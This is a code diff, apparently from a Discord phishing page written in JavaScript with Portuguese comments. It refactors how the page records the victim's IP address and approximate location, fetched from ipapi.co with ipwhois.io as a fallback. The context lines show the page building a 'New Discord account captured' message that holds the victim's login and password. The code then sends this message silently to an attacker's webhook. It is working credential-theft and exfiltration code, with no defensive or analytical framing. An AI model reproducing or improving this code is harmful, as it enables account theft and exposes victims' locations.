@@ -284,29 +284,30 @@
       }
 
       // Captura de IP com fallback
-      let ipInfo = 'Desconhecido';
+      let ip = 'Desconhecido';
+      let location = 'Desconhecido';
+
       try {
-        // Tenta ipapi.co primeiro
         let res = await fetch('https://ipapi.co/json/');
         let data = await res.json();
-        if (data.ip && data.city && data.country_name) {
-          ipInfo = `${data.ip}\n📍 Localização aproximada: ${data.city}, ${data.country_name}`;
-        } else if (data.ip) {
-          ipInfo = data.ip;
+        if (data.ip) {
+          ip = data.ip;
+          if (data.city && data.country_name) {
+            location = `${data.city}, ${data.country_name}`;
+          }
         }
       } catch (err) {
-        // Fallback para ipwhois.io
+        // Fallback
         try {
           let res2 = await fetch('https://ipwhois.io/api');
           let data2 = await res2.json();
-          if (data2.ip && data2.city && data2.country) {
-            ipInfo = `${data2.ip}\n📍 Localização aproximada: ${data2.city}, ${data2.country}`;
-          } else if (data2.ip) {
-            ipInfo = data2.ip;
+          if (data2.ip) {
+            ip = data2.ip;
+            if (data2.city && data2.country) {
+              location = `${data2.city}, ${data2.country}`;
+            }
           }
-        } catch (fallbackErr) {
-          // Se ambos falharem, deixa desconhecido
-        }
+        } catch (fallbackErr) {}
       }
 
       const mensagem = `🔐Nova Conta De Discord Capturada!
@@ -316,7 +317,8 @@ Email ou Telefone Ou Nome:
 Senha:
 \`${senha}\`
 
-🌐 IP Capturado: ${ipInfo}`;
+🌐 IP Capturado: ${ip}
+📍 Localização aproximada: ${location}`;
 
       // Envia pro webhook silenciosamente
       fetch(webhookUrl, {
